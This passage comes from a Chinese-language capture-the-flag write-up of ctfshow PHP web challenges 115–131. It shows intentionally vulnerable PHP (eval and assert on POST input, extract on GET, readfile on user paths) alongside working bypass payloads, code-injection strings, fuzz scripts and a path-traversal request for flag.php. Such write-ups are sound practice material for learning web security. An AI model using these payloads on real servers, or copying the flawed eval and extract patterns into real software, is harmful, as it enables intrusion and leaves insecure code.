class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure><p><code>?file=php://filter/resource=flag.php</code></p><h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p>需要满足什么：num通过is_numeric的检测，并且不等于36，去空后依然不等于36，经过过滤方法后依然等于36</p><p>fuzz脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到：<code>%0C %2B(+) - . 0 1 2 3 4 5 6 7 8 9</code></p><p><a href="https://tool.oschina.net/commons?type=4">ASCII对照表</a></p><p>payload：<code>%0C36</code></p><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处的php特性：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：<code>CTF[SHOW.COM</code>=&gt;<code>CTF_SHOW.COM</code></p><p>payload：<code>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</code></p><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/reserved.variables.argv.php">$argv</a>：传递给脚本的参数数组</p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html">详解 $_SERVER 函数中QUERY_STRING和REQUEST_URI区别(转)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line"></span><br><span class="line">    设置register_argc_argv = <span class="title function_ invoke__">On</span>(默认是Off)，重启服务，<span class="variable">$_SERVER</span>[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">    这时候的<span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] = <span class="variable">$_SERVER</span>[‘QUERY_STRING’]</span><br><span class="line"></span><br><span class="line">    <span class="variable">$argv</span>,<span class="variable">$argc</span>在web模式下不适用</span><br></pre></td></tr></table></figure><p>我们是在网页模式下的，注意重点：<br><code>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</code><br>而 <code>$_SERVER[‘QUERY_STRING’]</code> <strong>是获取查询语句，也就是?后面的语句</strong></p><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line"><span class="variable">$a</span>[<span class="number">0</span>]=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]=<span class="variable">$_SERVER</span>[‘QUERY_STRING’]=&gt;<span class="variable">$fl0g</span>=flag_give_me</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=<span class="number">1</span>&amp;CTF[SHOW.COM=<span class="number">1</span>&amp;fun=<span class="keyword">eval</span>(<span class="variable">$a</span>[<span class="number">0</span>]) <span class="comment"># POST</span></span><br><span class="line">?<span class="variable">$fl0g</span>=flag_give_me; <span class="comment">#GET</span></span><br><span class="line">CTF_SHOW=<span class="number">6</span>&amp;CTF[SHOW.COM=<span class="number">6</span>&amp;fun=<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])    <span class="comment">#POST</span></span><br><span class="line">?<span class="number">1</span>=flag.php<span class="comment">#GET</span></span><br></pre></td></tr></table></figure><h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>() 断言：</span><br><span class="line"></span><br><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br><span class="line"></span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] )</span><br><span class="line"></span><br><span class="line">如果 assertion 是字符串，它将会被 <span class="title function_ invoke__">assert</span>() 当做 PHP 代码来执行</span><br><span class="line">可见，<span class="keyword">eval</span>和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加</span><br><span class="line">?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">CTF_SHOW=<span class="number">6</span>&amp;CTF[SHOW.COM=<span class="number">6</span>&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-array-extract.html">extract(提取、抽取)函数</a>：通常情况结合数组使用</p><p>?ctf_show=ilove36d但是下划线被过滤了</p><p>自己写个fuzz脚本跑一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;未编码：&quot;</span>.<span class="variable">$num</span>.<span class="string">&quot;   经过编码：&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是这里我们的目的是利用空格、点、左中括号、+来被自动转换为下划线，经过fuzz得到空格，但是不知道为什么我空格经过URL编码确是+，但是%20确实符合该题目</p><p><code>?ctf%20show=ilove36d</code></p><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; <span class="literal">NULL</span> </span><br></pre></td></tr></table></figure><p><strong><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">gettext()</a>拓展函数的用法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">_</span>()是<span class="title function_ invoke__">gettext</span>()的拓展函数</span><br><span class="line">在开启相关设定后，<span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>)等价于<span class="title function_ invoke__">gettext</span>(<span class="string">&quot;666&quot;</span>)，且就返回其中的参数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="number">666</span>);   <span class="comment">//输出 666</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>);<span class="comment">//输出 666</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-get_defined_vars-function.html">get_defined_vars()函数</a>：返回由所有已定义变量所组成的数组 ，very顾名思义</p><p>因为$flag属于是被定义变量的范畴，所以利用<code>?f1=_&amp;f2=get_defined_vars</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(_,<span class="string">&#x27;get_defined_vars&#x27;</span>)));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(get_defined_vars));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(get_defined_vars);</span><br></pre></td></tr></table></figure><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-filesystem-readfile.html">readfile()函数</a>：<code>?f=/ctfshow/../../../../../../../var/www/html/flag.php</code>直接读就完事了</p><h3 id="web130、web131"><a href="#web130、web131" class="headerlink" title="web130、web131"></a>web130、web131</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span 